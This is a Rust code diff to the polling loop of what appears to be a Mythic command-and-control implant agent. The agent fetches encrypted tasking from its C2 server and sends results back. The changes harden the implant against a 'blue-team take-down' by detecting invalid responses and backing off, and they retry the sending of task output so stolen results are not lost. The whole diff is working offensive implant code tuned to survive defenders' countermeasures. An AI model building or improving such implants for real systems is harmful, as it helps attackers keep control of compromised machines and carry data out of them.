@@ -936,6 +936,12 @@ pub fn run_c2_loop<F>(
     }
 
     // ── Polling loop ──────────────────────────────────────────────────────────
+    // Bug #6: track consecutive invalid responses. A 200 OK with a body that
+    // fails HMAC verification / JSON parsing is indistinguishable from "no
+    // tasks" in the original code, so a blue-team take-down serving a static
+    // page would make the agent poll forever without noticing. After enough
+    // invalid responses we back off harder to avoid hammering a dead endpoint.
+    let mut invalid_response_streak: u32 = 0;
     loop {
         if should_exit() {
             break;
@@ -949,18 +955,48 @@ pub fn run_c2_loop<F>(
         let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
         let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);
 
+        // Bug #6: distinguish network errors, invalid responses (200 OK but body
+        // fails HMAC/JSON), and valid empty tasking. A take-down or MITM serving
+        // a static page returns 200 + non-Mythic body, which previously looked
+        // identical to "no tasks". We now count consecutive invalid responses
+        // and back off harder once the streak exceeds a threshold.
         let tasks: Vec<Task> = match client
             .post(&format!("{}{}", base, uri))
             .content_type("application/octet-stream")
             .send(&get_msg)
             .and_then(|mut r| r.body_mut().read_to_string())
         {
-            Ok(raw) => parse_mythic_message(&raw, &encryption_key)
+            Ok(raw) => match parse_mythic_message(&raw, &encryption_key)
                 .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
-                .map(|r| r.tasks)
-                .unwrap_or_default(),
+            {
+                Some(resp) => {
+                    // Valid Mythic response: reset the streak.
+                    invalid_response_streak = 0;
+                    resp.tasks
+                }
+                None => {
+                    // 200 OK but body failed HMAC or JSON parse: suspicious.
+                    invalid_response_streak = invalid_response_streak.saturating_add(1);
+                    let backoff = if invalid_response_streak > 10 {
+                        // Degraded mode: 4x the normal sleep to avoid hammering
+                        // a dead/hijacked endpoint.
+                        get_sleep_seconds().saturating_mul(4)
+                    } else {
+                        get_sleep_seconds()
+                    };
+                    sleep_with_jitter(backoff, get_jitter_percent());
+                    continue;
+                }
+            },
             Err(_) => {
-                sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
+                // Network error (connection refused, DNS, non-2xx status).
+                invalid_response_streak = invalid_response_streak.saturating_add(1);
+                let backoff = if invalid_response_streak > 10 {
+                    get_sleep_seconds().saturating_mul(4)
+                } else {
+                    get_sleep_seconds()
+                };
+                sleep_with_jitter(backoff, get_jitter_percent());
                 continue;
             }
         };
@@ -1075,10 +1111,24 @@ pub fn run_c2_loop<F>(
         let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
         let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);
 
-        let _ = client
-            .post(&format!("{}{}", base, uri))
-            .content_type("application/octet-stream")
-            .send(&post_msg);
+        // Bug #5: retry the final post_response instead of discarding the result.
+        // If Mythic is unreachable or returns an error between get_tasking and
+        // this response, the task results would be silently lost. Retry a few
+        // times with a short backoff so transient failures don't drop output.
+        let mut post_attempts = 0u8;
+        while post_attempts < 3 {
+            let send_result = client
+                .post(&format!("{}{}", base, uri))
+                .content_type("application/octet-stream")
+                .send(&post_msg);
+            if send_result.is_ok() {
+                break;
+            }
+            post_attempts += 1;
+            if post_attempts < 3 {
+                sleep_with_jitter(2, 25);
+            }
+        }
 
         if should_exit {
             encryption_key.zeroize();
